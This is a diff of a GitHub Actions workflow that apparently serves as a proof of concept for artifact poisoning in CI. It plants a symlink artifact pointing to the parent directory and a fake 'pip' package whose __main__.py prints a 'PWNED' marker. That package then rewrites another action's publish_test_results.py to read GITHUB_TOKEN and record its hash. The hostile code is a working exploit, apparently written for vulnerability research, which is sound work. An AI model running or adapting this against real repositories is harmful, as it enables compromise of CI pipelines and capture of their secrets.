@@ -9,18 +9,18 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - name: Plant artifact "." (symlink p -> ..)
-        uses: ./.github/actions/plant-multi
-        with:
-          name: "."
-          entries: |
-            [{"name":"p","content":"..","mode":41471}]
       - name: Plant artifact "p" (pip shadow)
         uses: ./.github/actions/plant-multi
         with:
           name: "p"
           entries: |
             [{"name": "pip/__init__.py", "content": ""}, {"name": "pip/__main__.py", "content": "import os, hashlib\n_j = os.environ.get('GITHUB_JOB'); _c = os.getcwd()\nprint('PWNED_PIP_SHADOW job=%s cwd=%s' % (_j, _c))\ntry:\n    open('/tmp/pip_pwn_marker.txt','a').write('EXEC job=%s cwd=%s ap=%s token_here=%s\\n' % (_j, _c, os.environ.get('GITHUB_ACTION_PATH'), 'GITHUB_TOKEN' in os.environ))\nexcept Exception as e:\n    print('marker fail', e)\n_ap = os.environ.get('GITHUB_ACTION_PATH') or ''\n_tgt = os.path.join(_ap, '..', 'python', 'publish_test_results.py') if _ap else ''\nif _tgt and os.path.exists(_tgt):\n    _code = (\"import os as _o, hashlib as _h\\n\"\n             \"_t = _o.environ.get('GITHUB_TOKEN','')\\n\"\n             \"open(_o.path.join(_o.environ.get('GITHUB_WORKSPACE','/tmp'),'token_proof.txt'),'w')\"\n             \".write('TOKEN_CAPTURED len=%d sha256=%s\\\\n' % (len(_t), _h.sha256(_t.encode()).hexdigest()))\\n\")\n    _src = open(_tgt).read()\n    if 'TOKEN_CAPTURED' not in _src:\n        open(_tgt,'w').write(_code + _src)\n        print('PATCHED publish script:', _tgt)\nelse:\n    print('no action path yet:', repr(_ap))\n"}]
+      - name: Plant artifact "." (symlink p -> ..)
+        uses: ./.github/actions/plant-multi
+        with:
+          name: "."
+          entries: |
+            [{"name":"p","content":"..","mode":41471}]
       - name: List artifacts for this run
         env:
           GH_TOKEN: ${{ github.token }}
